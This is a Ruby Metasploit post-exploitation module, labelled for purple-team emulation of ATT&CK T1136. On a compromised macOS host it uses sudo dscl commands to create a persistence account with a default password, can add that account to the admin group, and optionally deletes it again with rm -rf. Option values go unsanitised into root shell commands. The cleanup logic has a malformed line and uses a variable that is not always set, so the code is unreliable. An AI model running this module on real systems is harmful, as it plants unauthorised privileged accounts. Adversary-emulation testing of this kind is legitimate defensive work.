##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Create Account (T1136) macOS - Purple Team',
      'Description'    => %q{
        Persistence:
        Adversaries with a sufficient level of access may create a local system or domain account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

        The original meterpreter session must be running as root or allow sudo without a password.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Praetorian' ],
      'Platform'       => [ 'osx' ],
      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1136' ] ],
      'SessionTypes'        => [ 'meterpreter' ]
     ))
    register_options(
      [
    OptString.new("ACCOUNTNAME", [ false, "The name of the account to be created.", "t1136"]),
    OptString.new("ACCOUNTPASSWORD", [ false, "The password of the account to be created.", "Password1!"]),
    OptString.new("NAME", [ false, "The first and last name of the user of the account to be created.", "Anony Mous"]),
    OptString.new("UID", [ false, "The desired UniqueID for the account to be created.", "555"]),
    OptString.new("GROUPID", [ false, "The desired GroupID for the account to be created.", "20"]),
    OptBool.new("ADMIN", [ false, "Make the new account an admin?", false]),
    OptBool.new("CLEANUP", [ false, "If enabled, the created account will be deleted at the end of the script.", true])
  ])
  end

  def run
    return 0 if session.type != "meterpreter"

    print_status("Attempting to create an account called #{datastore['ACCOUNTNAME']} that has password #{datastore['ACCOUNTPASSWORD']}")

    create_account = cmd_exec("sudo /usr/bin/dscl . -create /Users/#{datastore['ACCOUNTNAME']}")

    if !create_account.blank?
      print_error create_account
    else
      print_good("Account successfully created.")
      print_status("Initializing newly created account. . . ")
    end

    create_shell = cmd_exec("sudo /usr/bin/dscl . -create /Users/#{datastore['ACCOUNTNAME']} UserShell /bin/bash")

    if !create_shell.blank?
      print_error create_shell
    end

    create_name = cmd_exec("sudo /usr/bin/dscl . -create /Users/#{datastore['ACCOUNTNAME']} RealName \"#{datastore['NAME']}\"")

    if !create_name.blank?
      print_error create_name
    end

    create_uid = cmd_exec("sudo /usr/bin/dscl . -create /Users/#{datastore['ACCOUNTNAME']} UniqueID \"#{datastore['UID']}\"")

    if !create_uid.blank?
        print_error create_uid
    end

    create_groupid = cmd_exec("sudo /usr/bin/dscl . -create /Users/#{datastore['ACCOUNTNAME']} PrimaryGroupID #{datastore['GROUPID']}")

    if !create_groupid.blank?
      print_error create_groupid
    end

    create_home = cmd_exec("sudo /usr/bin/dscl . -create /Users/#{datastore['ACCOUNTNAME']} NFSHomeDirectory /Users/#{datastore['ACCOUNTNAME']}")

    if !create_home.blank?
      print_error create_home
    end

    create_password = cmd_exec("sudo /usr/bin/dscl . -passwd /Users/#{datastore['ACCOUNTNAME']} #{datastore['ACCOUNTPASSWORD']}")

    if !create_password.blank?
        print_error create_password
    end

    print_good("Finished account initialization.")

    if datastore['ADMIN']
      make_admin = cmd_exec("sudo /usr/bin/dscl . -append /Groups/admin GroupMembership #{datastore['ACCOUNTNAME']}")
      print_error make_admin
    end

    if datastore['CLEANUP']
      print_status("Attempting to delete the newly created account.")
      delete_account = cmd_exec("sudo /usr/bin/dscl . delete /Users/#{datastore['ACCOUNTNAME']}")
      rm_dir = cmd_exec("sudo rm -rf /Users/#{datastore['ACCOUNTNAME']}")
    end

    if !delete_account.blank?print_error delete_account
    else
      print_good("Account successfully deleted!")
    end

    print_good("Module finished with success!")
  end
end
